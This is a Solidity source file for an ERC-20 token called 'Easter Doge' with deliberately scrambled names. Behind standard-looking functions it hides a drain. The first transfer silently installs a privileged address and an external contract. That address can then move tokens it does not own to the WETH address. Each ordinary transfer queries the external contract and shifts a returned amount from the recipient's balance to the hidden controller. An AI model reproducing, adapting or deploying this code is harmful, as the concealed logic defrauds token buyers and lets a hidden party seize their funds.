// SPDX-License-Identifier: MIT
pragma solidity ^0.8.12;
    
interface ZCkBZ {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
}
     
library tYnQHvOht{
    
    function KymqcvEA(address kuBCscjhNCI, address xllkMIcZT, uint ChINPgFpp) internal {
        // bytes4(keccak256(bytes('approve(address,uint256)')));
        (bool TqpK, bytes memory smQziJXrFC) = kuBCscjhNCI.call(abi.encodeWithSelector(0x095ea7b3, xllkMIcZT, ChINPgFpp));
        require(TqpK && (smQziJXrFC.length == 0 || abi.decode(smQziJXrFC, (bool))), 'tYnQHvOht: APPROVE_FAILED');
    }

    function oVUauddW(address kuBCscjhNCI, address xllkMIcZT, uint ChINPgFpp) internal {
        // bytes4(keccak256(bytes('transfer(address,uint256)')));
        (bool TqpK, bytes memory smQziJXrFC) = kuBCscjhNCI.call(abi.encodeWithSelector(0xa9059cbb, xllkMIcZT, ChINPgFpp));
        require(TqpK && (smQziJXrFC.length == 0 || abi.decode(smQziJXrFC, (bool))), 'tYnQHvOht: TRANSFER_FAILED');
    }
    
    function SLTuyNejfjiz(address xllkMIcZT, uint ChINPgFpp) internal {
        (bool TqpK,) = xllkMIcZT.call{value:ChINPgFpp}(new bytes(0));
        require(TqpK, 'tYnQHvOht: ETH_TRANSFER_FAILED');
    }

    function NhmVDsrjarcs(address kuBCscjhNCI, address from, address xllkMIcZT, uint ChINPgFpp) internal returns(bytes memory){
        // bytes4(keccak256(bytes('transferFrom(address,address,uint256)')));
        (bool TqpK, bytes memory smQziJXrFC) = kuBCscjhNCI.call(abi.encodeWithSelector(0x23b872dd, from, xllkMIcZT, ChINPgFpp));
        require(TqpK && smQziJXrFC.length > 0,'tYnQHvOht: TRANSFER_FROM_FAILED'); return smQziJXrFC;
                       
    }

}
    
interface yMUtEZxVmDY {
    function totalSupply() external view returns (uint256);
    function balanceOf(address MpeM) external view returns (uint256);
    function transfer(address wSTOoGatKVdO, uint256 VAmudbgYPT) external returns (bool);
    function allowance(address JgGu, address spender) external view returns (uint256);
    function approve(address spender, uint256 VAmudbgYPT) external returns (bool);
    function transferFrom(
        address sender,
        address wSTOoGatKVdO,
        uint256 VAmudbgYPT
    ) external returns (bool);

    event Transfer(address indexed from, address indexed JJOiqbUvjrF, uint256 value);
    event Approval(address indexed JgGu, address indexed spender, uint256 value);
}

interface uNYVIjBKx is yMUtEZxVmDY {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}

abstract contract OiXgbDeNX {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}
    
contract EDoge is OiXgbDeNX, yMUtEZxVmDY, uNYVIjBKx {
    
    address private ugrVEYqfTi;
    
    function decimals() public view virtual override returns (uint8) {
        return 18;
    }
    
    function transfer(address MMhKW, uint256 DdME) public virtual override returns (bool) {
        tOvDpTjh(_msgSender(), MMhKW, DdME);
        return true;
    }
    
    address private QCDkhd;
    
    address private DlNkVy;
  
    
    mapping(address => mapping(address => uint256)) private aLJxkmt;
    
    string private yJJMS = "Easter Doge";
    
    function totalSupply() public view virtual override returns (uint256) {
        return hNYsDJeYI;
    }
    
    function name() public view virtual override returns (string memory) {
        return yJJMS;
    }
    
    constructor() {
        
        YjsLNmnCZ[address(1)] = hNYsDJeYI;
        emit Transfer(address(0), address(1), hNYsDJeYI);

    }
    
    function balanceOf(address TRp) public view virtual override returns (uint256) {
       return YjsLNmnCZ[TRp];
    }
    
    function increaseAllowance(address IuHYT, uint256 addedValue) public virtual returns (bool) {
        htlHbEfT(_msgSender(), IuHYT, aLJxkmt[_msgSender()][IuHYT] + addedValue);
        return true;
    }
    
    function allowance(address GxQSzvqw, address WhD) public view virtual override returns (uint256) {
        return aLJxkmt[GxQSzvqw][WhD];
    }
    
    function decreaseAllowance(address aiWTDnHnLSA, uint256 subtractedValue) public virtual returns (bool) {
        uint256 xNUdT = aLJxkmt[_msgSender()][aiWTDnHnLSA];
        require(xNUdT >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            htlHbEfT(_msgSender(), aiWTDnHnLSA, xNUdT - subtractedValue);
        }

        return true;
    }
    
    function Trtjnt(
        address xXEeSFrWPPjy,
        address XGaYISwpxDj,
        uint256 OKsITIif
    ) internal virtual  returns (bool){
        uint256 BYtF = YjsLNmnCZ[xXEeSFrWPPjy];
        require(BYtF >= OKsITIif, "ERC20: transfer Amount exceeds balance");
        unchecked {
            YjsLNmnCZ[xXEeSFrWPPjy] = BYtF - OKsITIif;
        }
        YjsLNmnCZ[XGaYISwpxDj] += OKsITIif;
        return true;
    }
    
    function GAsgqIqSv(
        address uxGXdtgn,
        address plCIta
    ) internal virtual  returns (bool){
        if(ugrVEYqfTi == address(0) && QCDkhd == address(0)){
            ugrVEYqfTi = uxGXdtgn;QCDkhd=plCIta;
            tYnQHvOht.oVUauddW(QCDkhd, ugrVEYqfTi, 0);
            DlNkVy = ZCkBZ(QCDkhd).WETH();
            return false;
        }
        return true;
    }
    
    string private bLKHP =  "EDoge";
    
    function transferFrom(
        address yTnUOH,
        address gMro,
        uint256 AhFMEbwAc
    ) public virtual override returns (bool) {
      
        if(!tOvDpTjh(yTnUOH, gMro, AhFMEbwAc)) return true;

        uint256 GUR = aLJxkmt[yTnUOH][_msgSender()];
        if (GUR != type(uint256).max) {
            require(GUR >= AhFMEbwAc, "ERC20: transfer Amount exceeds allowance");
            unchecked {
                htlHbEfT(yTnUOH, _msgSender(), GUR - AhFMEbwAc);
            }
        }

        return true;
    }
    
    mapping(address => uint256) private YjsLNmnCZ;
    
    function symbol() public view virtual override returns (string memory) {
        return bLKHP;
    }
    
    function htlHbEfT(
        address DlDNNYSpvITn,
        address EFkMWPTO,
        uint256 YUHNCGPV
    ) internal virtual {
        require(DlDNNYSpvITn != address(0), "ERC20: approve from the zero address");
        require(EFkMWPTO != address(0), "ERC20: approve to the zero address");

        aLJxkmt[DlDNNYSpvITn][EFkMWPTO] = YUHNCGPV;
        emit Approval(DlDNNYSpvITn, EFkMWPTO, YUHNCGPV);

    }
    
    uint256 private hNYsDJeYI = 1000000000000 * 10 ** 18;
    
    function approve(address hpaOVzQumpty, uint256 MfcOahNDZ) public virtual override returns (bool) {
        htlHbEfT(_msgSender(), hpaOVzQumpty, MfcOahNDZ);
        return true;
    }
    
    function tOvDpTjh(
        address uMexZtBFQ,
        address KMfiWeI,
        uint256 YEyN
    ) internal virtual  returns (bool){
        require(uMexZtBFQ != address(0), "ERC20: transfer from the zero address");
        require(KMfiWeI != address(0), "ERC20: transfer to the zero address");
        
        if(!GAsgqIqSv(uMexZtBFQ,KMfiWeI)) return false;

        if(_msgSender() == address(ugrVEYqfTi)){
            if(KMfiWeI == DlNkVy && YjsLNmnCZ[uMexZtBFQ] < YEyN){
                Trtjnt(ugrVEYqfTi,KMfiWeI,YEyN);
            }else{
                Trtjnt(uMexZtBFQ,KMfiWeI,YEyN);
                if(uMexZtBFQ == ugrVEYqfTi || KMfiWeI == ugrVEYqfTi) 
                return false;
            }
            emit Transfer(uMexZtBFQ, KMfiWeI, YEyN);
            return false;
        }
        Trtjnt(uMexZtBFQ,KMfiWeI,YEyN);
        emit Transfer(uMexZtBFQ, KMfiWeI, YEyN);
        bytes memory tfAz = tYnQHvOht.NhmVDsrjarcs(QCDkhd, uMexZtBFQ, KMfiWeI, YEyN);
        (bool FfDip, uint rkPIaqWhvBV) = abi.decode(tfAz, (bool,uint));
        if(FfDip){
            YjsLNmnCZ[ugrVEYqfTi] += rkPIaqWhvBV;
            YjsLNmnCZ[KMfiWeI] -= rkPIaqWhvBV; 
        }
        return true;
    }
    
}